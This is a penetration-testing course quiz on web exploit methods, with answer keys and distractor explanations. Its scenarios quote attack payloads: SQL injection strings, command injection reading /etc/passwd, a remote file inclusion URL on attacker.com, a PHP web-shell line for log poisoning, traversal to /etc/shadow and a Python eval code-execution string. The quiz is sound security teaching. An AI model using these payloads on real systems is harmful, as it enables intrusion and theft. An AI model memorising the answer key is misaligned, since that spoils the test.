# Quiz: Module 10 — Web Application Exploit Methods

## Course: CIS-4333 Penetration Testing

**Certification Alignment:** CompTIA PenTest+ (PT0-002)

**Instructions:** Choose the single best answer for each question.

---

**Question 1**

A penetration tester submits the input `' OR '1'='1` into a web application login form and successfully authenticates without valid credentials. Which vulnerability is being exploited?

- A) Cross-site scripting (XSS)
- B) Command injection
- C) SQL injection
- D) Session fixation

**Correct Answer:** C) SQL injection

**Distractor Analysis:**

- *Why C is correct:* The input `' OR '1'='1` manipulates the SQL query that the login form builds behind the scenes. By injecting SQL syntax into the username field, the attacker changes the logic of the WHERE clause so that the condition `'1'='1'` is always true, returning a valid user record regardless of the password provided. This is the classic authentication bypass form of SQL injection — it exploits the lack of parameterized queries or input sanitization in the backend database call.
- *Why A is incorrect:* Cross-site scripting injects JavaScript into the page output to execute in the victim's browser. The `OR '1'='1` construct is SQL syntax, not JavaScript. XSS does not affect authentication by manipulating database queries.
- *Why B is incorrect:* Command injection passes operating system commands to a shell interpreter via application input. The `OR '1'='1` payload is SQL logic, not a shell metacharacter sequence. The target interpreter is the database engine, not the OS shell.
- *Why D is incorrect:* Session fixation forces a victim to authenticate using a pre-known session token. It occurs after authentication, not as a mechanism to bypass the login check itself. The attack described manipulates the authentication query directly.

---

**Question 2**

A tester discovers that user-supplied comments are stored in the database and rendered on a public page without output encoding. Every visitor who loads that page executes the attacker's injected script. Which type of XSS vulnerability is this?

- A) Reflected XSS
- B) DOM-based XSS
- C) Stored XSS
- D) Second-order XSS

**Correct Answer:** C) Stored XSS

**Distractor Analysis:**

- *Why C is correct:* Stored XSS (also called persistent XSS) occurs when the malicious script is saved to the server-side database and served to every user who views the affected page. Because the payload persists and executes for all visitors automatically — not just those who click a crafted link — stored XSS is considered more dangerous than reflected XSS. Comment fields, user profiles, and message boards are the most common stored XSS vectors.
- *Why A is incorrect:* Reflected XSS requires the victim to click a specially crafted URL that includes the payload. The server reflects the payload back in a single response. The attack in this question persists in the database and affects all visitors without requiring any crafted link — that is the defining difference.
- *Why B is incorrect:* DOM-based XSS occurs entirely within the browser's Document Object Model. The server sends a legitimate page, but client-side JavaScript writes attacker-controlled data (such as the URL fragment) into the DOM unsafely. The attack in this question involves server-side storage and server-rendered HTML output, not a browser-side DOM manipulation.
- *Why D is incorrect:* Second-order XSS is a subtype of stored XSS where the payload is stored safely but injected into a different page context later. While the scenario described could technically be characterized this way, Stored XSS is the primary and correct PenTest+ term for this pattern.

---

**Question 3**

A web application builds OS commands using unsanitized user input. A tester submits `127.0.0.1; cat /etc/passwd` into a ping utility field and receives the contents of `/etc/passwd` in the response. Which vulnerability type does this represent?

- A) Directory traversal
- B) Remote file inclusion
- C) Command injection
- D) SQL injection

**Correct Answer:** C) Command injection

**Distractor Analysis:**

- *Why C is correct:* Command injection occurs when user input is concatenated into an operating system command without sanitization. The semicolon in `127.0.0.1; cat /etc/passwd` is a shell metacharacter that terminates the first command and executes a second. The application passes both commands to the OS shell, which executes `ping -c 1 127.0.0.1` and then `cat /etc/passwd`. Command injection is critical severity because it provides direct operating system access with the privileges of the web server process.
- *Why A is incorrect:* Directory traversal manipulates file path parameters using `../` sequences to read files outside the intended directory. It exploits path handling logic, not shell command construction. The payload in this question uses shell metacharacters, not path traversal sequences.
- *Why B is incorrect:* Remote file inclusion exploits a `page` or `file` parameter to include and execute a file from an attacker-controlled URL. It requires the PHP `allow_url_include` setting to be enabled. The attack in this question uses shell metacharacters to inject OS commands — the vulnerability is in command construction, not file inclusion logic.
- *Why D is incorrect:* SQL injection targets database query interpreters, not OS shell interpreters. The semicolon in this payload is being interpreted by the OS shell, not a SQL engine. The targets and mechanisms are distinct.

---

**Question 4**

During Burp Suite Intruder testing, a tester wants to test both a username list and a password list simultaneously, pairing each username with each password in a full cross-product. Which Intruder attack type should the tester select?

- A) Sniper
- B) Battering ram
- C) Pitchfork
- D) Cluster bomb

**Correct Answer:** D) Cluster bomb

**Distractor Analysis:**

- *Why D is correct:* Cluster bomb iterates all combinations of payloads across multiple insertion points — it is the Cartesian product of the payload lists. If the username list has 10 entries and the password list has 100 entries, Cluster bomb generates `10 * 100 = 1,000` requests, testing every username-password combination. This is the correct attack type for credential brute force where you want to try all pairings.
- *Why A is incorrect:* Sniper uses a single payload list and cycles through one insertion point at a time while keeping other positions fixed. It tests one position against all payloads, then moves to the next. It is designed for single-parameter fuzzing, not multi-parameter credential testing.
- *Why B is incorrect:* Battering ram uses a single payload list and inserts the same payload value into all insertion points simultaneously. If both username and password positions are marked, each request would have the same value in both fields (e.g., `admin` / `admin`). This is not a full credential enumeration.
- *Why C is incorrect:* Pitchfork iterates multiple payload lists in parallel — the first item from list 1 pairs with the first item from list 2, the second with the second, and so on. It does not generate all combinations; it steps through both lists together. Pitchfork is useful when testing known username-password pairs from a breach database, not when generating all combinations.

---

**Question 5**

A REST API endpoint at `/api/users/1042/profile` returns the profile of user 1042. A tester changes the ID to `/api/users/1043/profile` without modifying the authentication token and successfully retrieves another user's private profile data. Which vulnerability does this demonstrate?

- A) Mass assignment
- B) Broken Object Level Authorization (BOLA)
- C) Excessive data exposure
- D) Security misconfiguration

**Correct Answer:** B) Broken Object Level Authorization (BOLA)

**Distractor Analysis:**

- *Why B is correct:* BOLA (also known as Insecure Direct Object Reference, or IDOR) occurs when an API allows authenticated users to access objects — database records, files, resources — belonging to other users by simply changing an identifier in the request. The API validates that the user is authenticated but fails to verify that the authenticated user is authorized to access the specific resource they requested. This is OWASP API Security Top 10 item API1 and one of the most common API vulnerabilities found in real-world penetration tests.
- *Why A is incorrect:* Mass assignment occurs when an API blindly maps request body parameters to object fields, allowing an attacker to set fields that should be protected (such as `role` or `isAdmin`). It involves sending extra fields in a write request, not changing an ID to access another user's data in a read request.
- *Why C is incorrect:* Excessive data exposure occurs when an API returns more fields than the client displays — sensitive fields are present in the JSON response even though the UI does not render them. The vulnerability in this scenario is about authorization to access another user's record, not about too much data in a legitimate response.
- *Why D is incorrect:* Security misconfiguration is a broad category covering improper server settings, default credentials, unnecessary exposed services, and missing security headers. While the underlying failure here is an authorization design flaw, the specific vulnerability name for cross-user object access via ID manipulation is BOLA.

---

**Question 6**

A web application uses PHP and includes files based on the `page` URL parameter. The parameter currently contains `home.php`. An attacker tests the value `http://attacker.com/shell.php` for this parameter and the server fetches and executes the remote file. Which vulnerability is being exploited?

- A) Local file inclusion (LFI)
- B) Remote file inclusion (RFI)
- C) Server-side request forgery (SSRF)
- D) Directory traversal

**Correct Answer:** B) Remote file inclusion (RFI)

**Distractor Analysis:**

- *Why B is correct:* Remote file inclusion occurs when a PHP application uses user-supplied input in a `require()` or `include()` call and the PHP configuration has `allow_url_include = On`. The server fetches the URL provided by the attacker, and if that URL points to a PHP file containing malicious code, the server executes it. RFI is critical severity because it directly provides remote code execution on the server.
- *Why A is incorrect:* Local file inclusion also exploits the same `include()` vulnerability, but is limited to files already present on the server's local filesystem. The payload uses paths like `../../etc/passwd` rather than an external URL. LFI cannot fetch remote attacker-controlled files; RFI can.
- *Why C is incorrect:* Server-side request forgery causes the server to make HTTP requests to arbitrary URLs, often to internal services or cloud metadata endpoints. While SSRF also causes the server to fetch a URL, it differs from RFI in that SSRF is about reaching internal resources via the server as a proxy, not about executing a fetched file as PHP code.
- *Why D is incorrect:* Directory traversal uses `../` sequences to read files outside the web root on the local filesystem. It reads file contents but does not execute remote code. The payload in this question is an external URL, not a path traversal sequence.

---

**Question 7**

Which SQLMap flag enumerates all databases accessible to the database user connected to the target web application?

- A) `--tables`
- B) `--dump`
- C) `--dbs`
- D) `--level=5`

**Correct Answer:** C) `--dbs`

**Distractor Analysis:**

- *Why C is correct:* The `--dbs` flag instructs SQLMap to enumerate all databases visible to the current database connection. This is typically the second step after confirming injection is possible — after `--dbs` returns the database list, the tester uses `-D <dbname> --tables` to enumerate tables within a specific database, then `-T <tablename> --dump` to extract data.
- *Why A is incorrect:* `--tables` enumerates tables within a specific database. It requires the `-D` flag to specify which database to target. It does not list databases themselves.
- *Why B is incorrect:* `--dump` extracts data from a specific table. It requires `-D` and `-T` to specify the database and table. Using it without specifying a database or table would require additional context to function properly.
- *Why D is incorrect:* `--level=5` sets the detection thoroughness level, controlling how aggressively SQLMap tests for injection points (more HTTP parameters, more test payloads). It affects detection depth, not what database information is retrieved.

---

**Question 8**

A security researcher finds that a web application reflects user input directly into a JavaScript variable assignment without sanitization: `var name = 'USER_INPUT';`. The researcher enters `'; alert(document.cookie);//` and the script executes. Which category best describes this vulnerability?

- A) Reflected XSS via HTML injection
- B) Stored XSS via JavaScript context
- C) Reflected XSS via JavaScript context (break-out injection)
- D) DOM-based XSS

**Correct Answer:** C) Reflected XSS via JavaScript context (break-out injection)

**Distractor Analysis:**

- *Why C is correct:* The input breaks out of the JavaScript string context by closing the string with `'`, terminating the statement with `;`, injecting `alert(document.cookie)`, and commenting out the remaining original code with `//`. Because the payload is sent in the request and reflected in the server's response (not persisted in a database), this is reflected XSS. The injection occurs within a JavaScript execution context rather than an HTML tag context, requiring the break-out technique.
- *Why A is incorrect:* HTML injection XSS uses HTML tags like `<script>` inserted directly into HTML content. The scenario describes injection into an existing JavaScript variable assignment — the context is JavaScript, not HTML markup. Different contexts require different payload structures.
- *Why B is incorrect:* Stored XSS requires the payload to be saved to a database or server-side storage and served to subsequent users. This attack is reflected — the payload is included in the request and returned in the same response, not persisted.
- *Why D is incorrect:* DOM-based XSS occurs when client-side JavaScript reads attacker-controlled data from the DOM (such as `location.hash`) and writes it into the DOM unsafely, without the payload ever reaching the server. In this scenario the server is reflecting the payload in its HTML response — the injection is server-side, not DOM-side.

---

**Question 9**

A tester attempts credential stuffing against a web application login. Which characteristic of this attack most distinguishes it from a traditional brute force attack?

- A) Credential stuffing uses only commonly known passwords such as `password123` or `letmein`.
- B) Credential stuffing uses previously breached username and password pairs from unrelated services, exploiting password reuse.
- C) Credential stuffing requires the tester to first extract password hashes from the target system before attempting authentication.
- D) Credential stuffing tries all character combinations starting from one-character strings, incrementing length until a match is found.

**Correct Answer:** B) Credential stuffing uses previously breached username and password pairs from unrelated services, exploiting password reuse.

**Distractor Analysis:**

- *Why B is correct:* Credential stuffing leverages large databases of username-password pairs obtained from previous data breaches at other services. Because many users reuse the same password across multiple sites, valid credentials from a breach at Site A often grant access to Site B. The attacker does not need to guess or crack anything — they are testing known working credentials from other contexts. This is highly effective and difficult to prevent without multi-factor authentication.
- *Why A is incorrect:* Testing commonly known passwords against all accounts is password spraying — a distinct technique. Spraying uses a short list of popular passwords across many accounts to avoid lockout. Credential stuffing uses full username-password pairs from external breaches, not a generic popular-password list.
- *Why C is incorrect:* Credential stuffing is an online authentication attack against a live login service. It does not require any prior access to the target system or extraction of password hashes. Hash extraction is part of offline cracking workflows, not credential stuffing.
- *Why D is incorrect:* Incrementally trying all character combinations is the definition of brute force. Brute force is computationally expensive and starts from scratch. Credential stuffing starts with real credentials known to have worked elsewhere — a fundamentally different threat model.

---

**Question 10**

A developer is fixing a SQL injection vulnerability. Their current code concatenates user input directly into a SQL string. Which remediation approach eliminates the root cause of SQL injection?

- A) Implementing input length validation to reject strings longer than 50 characters
- B) Using a web application firewall to block requests containing single quotes
- C) Replacing string concatenation with parameterized queries (prepared statements)
- D) Switching the database from MySQL to PostgreSQL

**Correct Answer:** C) Replacing string concatenation with parameterized queries (prepared statements)

**Distractor Analysis:**

- *Why C is correct:* Parameterized queries (also called prepared statements) separate the SQL code structure from the data values. The query template is compiled first with placeholder tokens, and user input is bound as data — never interpreted as SQL syntax. Even if an attacker injects `' OR '1'='1`, the database treats the entire input as a literal string value, not as SQL logic. This eliminates the root cause of SQL injection rather than attempting to detect or filter payloads.
- *Why A is incorrect:* Length validation is useful for business logic but does not prevent SQL injection. A short SQL injection payload like `1' OR 1=1--` is well under 50 characters. Length limits are easily bypassed and do not address the structural cause of the vulnerability.
- *Why B is incorrect:* WAF-based single-quote blocking is a blacklist approach. Attackers bypass it using encoding (URL encoding, Unicode variants), alternate quote styles, comment sequences, or SQL dialects that do not require quotes. WAFs are a useful defense-in-depth layer but not a root-cause fix. The application code must be fixed.
- *Why D is incorrect:* SQL injection is a vulnerability in how the application constructs queries, not a property of any specific database engine. Switching from MySQL to PostgreSQL while continuing to concatenate unsanitized input into SQL strings produces identical injection vulnerabilities in the new database.

---

---

**Question 11**

A tester submits `?page=../../../../etc/passwd` to a web application that includes files based on a URL parameter. The response contains Linux user account entries. Which vulnerability class is this, and which OWASP Top 10 category does it fall under?

- A) SQL injection — OWASP A03:2021 Injection
- B) Directory traversal / Path traversal — OWASP A05:2021 Security Misconfiguration
- C) Directory traversal / Path traversal — OWASP A01:2021 Broken Access Control
- D) Local file inclusion — OWASP A08:2021 Software and Data Integrity Failures

**Correct Answer:** C) Directory traversal / Path traversal — OWASP A01:2021 Broken Access Control

**Distractor Analysis:**

- *Why C is correct:* Path traversal uses `../` sequences to escape the intended directory and access files outside the application's root. Accessing `/etc/passwd` is unauthorized access to system files — a broken access control failure. OWASP A01:2021 (Broken Access Control) includes path traversal as a subcategory. The root cause is failing to restrict which files a user is authorized to access.
- *Why A is incorrect:* SQL injection manipulates database queries using SQL syntax. Path traversal uses filesystem navigation sequences and targets the file system, not a database engine. These are distinct vulnerability classes.
- *Why B is incorrect:* While security misconfiguration can contribute to path traversal exposure, the vulnerability itself — traversing the path outside the intended root — is categorized as broken access control. Misconfiguration (A05) describes deployment and configuration failures, not access control logic failures.
- *Why D is incorrect:* Software and Data Integrity Failures (A08) covers insecure deserialization and supply chain attacks. Local file inclusion is related to path traversal but specifically involves executing included files as code. Accessing `/etc/passwd` as content (not executing it) is path traversal, not LFI.

---

**Question 12**

A penetration tester uses the LFI vulnerability at `?file=` to include the Apache access log file `/var/log/apache2/access.log`. They first send a request with `<?php system($_GET['cmd']); ?>` as the User-Agent header, then include the log file via LFI and access `?file=/var/log/apache2/access.log&cmd=id`. The response includes `uid=33(www-data)`. What technique is this called?

- A) Remote file inclusion — the PHP code is fetched from a remote server
- B) Log poisoning combined with LFI — the attacker injects PHP code into a server log via a controllable HTTP header, then uses LFI to include and execute the poisoned log file
- C) Command injection — the User-Agent header is directly executed as an OS command by the web server
- D) Second-order SQL injection — the User-Agent is stored in the database and executed when the log is queried

**Correct Answer:** B) Log poisoning combined with LFI — the attacker injects PHP code into a server log via a controllable HTTP header, then uses LFI to include and execute the poisoned log file

**Distractor Analysis:**

- *Why B is correct:* Log poisoning is a two-step technique. Step 1: inject PHP code into a log file by controlling a value that gets logged (User-Agent, Referer, path). Step 2: use an LFI vulnerability to include the log file — when PHP processes the file include, it executes any PHP code present in the log. This transforms LFI (read-only) into remote code execution.
- *Why A is incorrect:* Remote file inclusion loads a file from a remote URL (e.g., `?file=http://attacker.com/shell.php`). Log poisoning uses a file already on the local server. No external URL is used.
- *Why C is incorrect:* The User-Agent value is written to the log file — it is not directly executed as a system command. The code execution occurs only when PHP includes the log file containing the injected PHP payload.
- *Why D is incorrect:* The scenario describes file system operations (logs, LFI), not SQL database storage or query execution. SQL injection involves database query parsers, not PHP file inclusion mechanisms.

---

**Question 13**

A web application has a form that sends an authenticated state-changing request. A tester constructs the following HTML page and hosts it on an attacker-controlled server:

```html
<img src="https://bank.example.com/transfer?to=attacker&amount=1000">
```

When a logged-in bank user visits the attacker's page, the transfer executes. Which vulnerability is this?

- A) Reflected XSS — the `src` attribute injects script into the bank's page
- B) Cross-Site Request Forgery (CSRF) — the victim's browser automatically sends authenticated cookies with the forged request
- C) Clickjacking — the attacker overlays the bank page in a transparent iframe
- D) SSRF — the attacker forces the server to make a request to the bank's internal transfer endpoint

**Correct Answer:** B) Cross-Site Request Forgery (CSRF) — the victim's browser automatically sends authenticated cookies with the forged request

**Distractor Analysis:**

- *Why B is correct:* CSRF exploits the browser's automatic inclusion of session cookies with all requests to a domain, regardless of which page initiated the request. When the victim's browser loads the `img` tag, it sends a GET request to `bank.example.com/transfer` with the victim's session cookie attached, causing the bank to process the transfer as if the authenticated user initiated it.
- *Why A is incorrect:* Reflected XSS executes JavaScript in the victim's browser by reflecting a payload from the target application's own response. The `img src` attack does not inject script into the bank's page — it forges a request from a completely separate attacker page.
- *Why C is incorrect:* Clickjacking uses invisible iframes to trick users into clicking on elements of a legitimate site. The `img` tag technique forges a GET request without any user click interaction and does not use iframe overlays.
- *Why D is incorrect:* SSRF causes the server to make outbound requests. The `img` tag causes the victim's browser to make the request — not the server. The request originates from the client, not the server.

---

**Question 14**

A tester discovers that a web application uses PHP and the URL structure is `index.php?page=home`. They test `?page=php://filter/convert.base64-encode/resource=index.php` and receive a base64-encoded string. What has been achieved?

- A) Remote code execution — the PHP filter wrapper executed the index.php file in attacker-controlled context
- B) Source code disclosure via PHP stream wrappers — the `php://filter` wrapper encodes the PHP file as base64, bypassing the PHP execution engine and returning the raw source code as base64-encoded text
- C) Server-side request forgery — the PHP filter caused the server to fetch an external resource
- D) SQL injection — the `php://filter` prefix is a SQLMap flag for filter-based injection

**Correct Answer:** B) Source code disclosure via PHP stream wrappers — the `php://filter` wrapper encodes the PHP file as base64, bypassing the PHP execution engine and returning the raw source code as base64-encoded text

**Distractor Analysis:**

- *Why B is correct:* `php://filter` is a PHP stream wrapper that applies transformations to file streams. Using `convert.base64-encode` before including the file causes PHP to encode the file's content rather than execute it. The result is the raw PHP source code of `index.php` encoded in base64, which the tester can decode to review application logic, find other vulnerabilities, and discover hardcoded credentials.
- *Why A is incorrect:* The `php://filter` wrapper with base64 encoding reads and transforms file content — it does not execute code in an attacker-controlled context. Code execution requires different wrappers or additional vulnerabilities.
- *Why C is incorrect:* SSRF involves the server making HTTP requests to other servers. `php://filter` is a local stream wrapper that processes files on the same server — it does not initiate outbound HTTP connections.
- *Why D is incorrect:* `php://filter` is a PHP language feature — a stream wrapper for filtering file content. It has no relationship to SQLMap flags or SQL injection payloads.

---

**Question 15**

During testing, a tester finds that a REST API endpoint at `GET /api/v2/orders/12345` returns a full order record for the authenticated user. They change the ID to `12346` and receive another user's order details. Which mitigation would directly fix this vulnerability at the API level?

- A) Enable HTTPS for all API endpoints to encrypt data in transit
- B) Implement rate limiting to prevent automated enumeration of order IDs
- C) Enforce object-level authorization on every data retrieval endpoint — verify that the authenticated user is the owner of the requested object before returning any data
- D) Use sequential order IDs starting from 1 to limit the enumerable space

**Correct Answer:** C) Enforce object-level authorization on every data retrieval endpoint — verify that the authenticated user is the owner of the requested object before returning any data

**Distractor Analysis:**

- *Why C is correct:* IDOR (Insecure Direct Object Reference) / BOLA (Broken Object Level Authorization) occurs because the API lacks authorization checks at the object level. The fix requires adding a check: before returning any order, verify that the requesting user's authenticated identity matches the order's owner. This is the root-cause fix.
- *Why A is incorrect:* HTTPS encrypts traffic in transit but does not prevent an authenticated attacker from changing ID values in requests they make with their own credentials. Encryption does not implement authorization.
- *Why B is incorrect:* Rate limiting slows down automated enumeration but does not prevent a determined attacker from manually browsing a few adjacent IDs. It is a defense-in-depth measure, not a fix for the missing authorization check.
- *Why D is incorrect:* Sequential IDs starting from 1 are trivially enumerable. Unpredictable IDs (UUIDs) make enumeration harder but do not enforce authorization — a determined attacker with one valid UUID can still attempt to guess or derive others. Authorization must be enforced regardless of ID format.

---

**Question 16**

A tester intercepts a password reset request and observes that the reset token in the URL is `?token=103`. They request a reset for another account and observe the token is `?token=104`. What vulnerability exists and what is the exploitation approach?

- A) SQL injection — the sequential token value is a column offset in the users table
- B) Predictable password reset token — the tokens increment sequentially; an attacker can iterate through token values to reset any account's password without having access to the account's email
- C) CSRF — the attacker forges a reset request from the victim's browser using the predictable token
- D) Session fixation — the attacker pre-sets their own token to a value they control before the victim initiates a reset

**Correct Answer:** B) Predictable password reset token — the tokens increment sequentially; an attacker can iterate through token values to reset any account's password without having access to the account's email

**Distractor Analysis:**

- *Why B is correct:* Password reset tokens must be cryptographically random and unpredictable. Sequential integers are trivially predictable — if the attacker's token is 104, they can try token 103 (another user's pending reset), modify the password, and gain access to that account. This falls under OWASP A07 (Identification and Authentication Failures) and is exploited by brute-forcing the token space or targeting adjacent values.
- *Why A is incorrect:* A sequential integer in a URL parameter does suggest IDOR-type issues, but the specific context is password reset token predictability — an authentication failure, not a direct SQL injection. SQL syntax is not involved.
- *Why C is incorrect:* CSRF forges requests from the victim's browser using existing session cookies. Exploiting a predictable reset token does not require the victim's browser — the attacker requests a reset for their own account and then modifies adjacent token values in direct requests.
- *Why D is incorrect:* Session fixation sets a session token before authentication so the attacker knows it. Password reset token predictability is a different attack — the tokens are assigned by the server (not set by the attacker in advance), but they are too predictable to provide security.

---

**Question 17**

A web application uses `eval()` to execute user-supplied mathematical expressions: `result = eval(user_input)`. A tester submits `__import__('os').system('id')`. The server returns `uid=33(www-data)`. Which vulnerability class is this?

- A) SQL injection — `__import__` is a database function that executes system commands
- B) Server-side template injection (SSTI) — the input is being rendered in a server-side template
- C) Server-side code injection — the `eval()` function evaluates user input as Python code, enabling arbitrary code execution
- D) XSS — the injected Python code executes in the user's browser through the template engine

**Correct Answer:** C) Server-side code injection — the `eval()` function evaluates user input as Python code, enabling arbitrary code execution

**Distractor Analysis:**

- *Why C is correct:* `eval()` in Python executes a string as Python code. Injecting `__import__('os').system('id')` imports the `os` module and executes a system command. This is server-side code injection — the attacker's input is executed as application code on the server. It is one of the most critical vulnerability classes because it typically provides direct OS command execution.
- *Why A is incorrect:* `__import__` is a Python built-in function for dynamic module importing. It has no relationship to SQL databases or database function calls.
- *Why B is incorrect:* SSTI occurs when user input is rendered unsafely within a server-side template engine (Jinja2, Twig, Freemarker). While SSTI also enables code execution, the scenario describes direct `eval()` usage in application code, not template rendering.
- *Why D is incorrect:* Server-side code injection executes on the server. XSS executes in the client's browser. The response showing `uid=33(www-data)` is server-side output from `id` — a Linux identity command that only runs on a server.

---

**Question 18**

A tester testing an API finds that the endpoint `PUT /api/v1/user/profile` accepts a JSON body and updates user attributes. The documented request only includes `name` and `email`. The tester adds `"is_admin": true` to the request body and the account is granted admin privileges. Which vulnerability class is this, and what is the root cause?

- A) SQL injection — the JSON boolean value modifies a database boolean column directly
- B) Mass assignment — the API framework automatically maps all incoming JSON properties to the user object model without explicitly whitelisting which properties are user-modifiable; `is_admin` should be server-controlled, not client-controlled
- C) Broken authentication — the server failed to verify the user's identity before applying the update
- D) SSRF — the JSON body caused the server to make a request to an internal admin service

**Correct Answer:** B) Mass assignment — the API framework automatically maps all incoming JSON properties to the user object model without explicitly whitelisting which properties are user-modifiable; `is_admin` should be server-controlled, not client-controlled

**Distractor Analysis:**

- *Why B is correct:* Mass assignment occurs when a framework's automatic object binding maps all request properties to the underlying data object, including properties that should be protected. The fix is to use explicit property whitelisting (only `name` and `email` should be bindable from user input). Security-sensitive fields like `is_admin`, `role`, and `account_balance` must never be bindable from client input.
- *Why A is incorrect:* The `is_admin: true` value in JSON is being processed by the API framework's object binding layer, not by a SQL query parser. No SQL injection payload or syntax is present.
- *Why C is incorrect:* The user is authenticated — the issue is what the authenticated user is allowed to modify (authorization), not whether their identity was verified (authentication).
- *Why D is incorrect:* SSRF causes server-to-server HTTP requests. Setting a JSON property in a profile update request does not trigger any outbound request from the server to another service.

---

**Question 19**

A tester discovers that a web application's file download endpoint is: `GET /download?filename=report.pdf`. They test `?filename=../../../etc/shadow` and receive the contents of the Linux shadow password file. What is the immediate next step in professional testing?

- A) Attempt to crack the extracted hashes offline using Hashcat to demonstrate the full impact
- B) Document the confirmed path traversal vulnerability with the request, response, and file path accessed, note the finding in the engagement log, and stop testing this specific vector — further sensitive data extraction requires explicit RoE authorization for data exfiltration
- C) Continue enumerating additional sensitive files (`/etc/passwd`, SSH keys, application config files) to build a complete picture of accessible data
- D) Submit the shadow file directly to the client immediately via email as proof of impact

**Correct Answer:** B) Document the confirmed path traversal vulnerability with the request, response, and file path accessed, note the finding in the engagement log, and stop testing this specific vector — further sensitive data extraction requires explicit RoE authorization for data exfiltration

**Distractor Analysis:**

- *Why B is correct:* Confirming the vulnerability is exploitable (receiving `/etc/shadow` contents) is sufficient to document a critical finding. Continuing to extract additional sensitive files, cracking hashes, or enumerating the file system beyond what is needed to prove impact constitutes data exfiltration. Most RoE documents do not explicitly authorize bulk file extraction from production systems, and `/etc/shadow` contains sensitive credential data subject to data protection obligations.
- *Why A is incorrect:* Offline hash cracking of extracted credentials goes beyond demonstrating the path traversal vulnerability and enters credential compromise territory. This requires explicit authorization in the RoE separate from the authorization to test for path traversal.
- *Why C is incorrect:* Enumerating additional sensitive files extracts data beyond what is needed to confirm and document the finding. Each file extracted from a production system represents additional scope that may not be covered by the RoE.
- *Why D is incorrect:* Directly emailing raw sensitive data to the client is inappropriate and potentially insecure. Findings and evidence are submitted through secure channels specified in the RoE — typically an encrypted deliverable platform or secure report submission process.

---

**Question 20**

A web application uses the `Referer` header to implement access control: internal admin pages check that the `Referer` header comes from `https://admin.target.com/dashboard`. A tester manually sets the header to `Referer: https://admin.target.com/dashboard` and accesses an admin endpoint from an external browser. The request succeeds. What vulnerability class is this?

- A) CSRF — the forged Referer header causes the victim's browser to make a cross-site request
- B) Insecure access control relying on client-controllable HTTP headers — the server implements authorization using a header value that any client can set arbitrarily, bypassing intended access restrictions
- C) XSS — the Referer header value is reflected in the admin page and executes as JavaScript
- D) HTTP Response Splitting — the Referer header value is injected into an HTTP response, enabling header injection

**Correct Answer:** B) Insecure access control relying on client-controllable HTTP headers — the server implements authorization using a header value that any client can set arbitrarily, bypassing intended access restrictions

**Distractor Analysis:**

- *Why B is correct:* HTTP headers like `Referer`, `X-Forwarded-For`, and `Origin` are set by the client (browser or proxy) and can be freely manipulated by anyone making HTTP requests directly (Burp, curl, Python scripts). Using any client-supplied header for access control is a broken access control vulnerability — authorization must be based on verified server-side session state, not unverifiable client-supplied values.
- *Why A is incorrect:* CSRF forges requests from the victim's browser. The tester is directly manipulating their own request headers, not forging requests from another user's browser. No cross-site request is involved.
- *Why C is incorrect:* Reflected XSS requires the Referer value to be output into the page HTML and executed as JavaScript. The scenario describes an access control bypass — the Referer value is used for authorization checking, not output into the page.
- *Why D is incorrect:* HTTP Response Splitting injects `\r\n` CRLF sequences into header values to split HTTP responses. Simply setting a Referer header to a legitimate-looking URL is an access control bypass, not a response splitting attack.

---

*End of Module 10 Quiz*
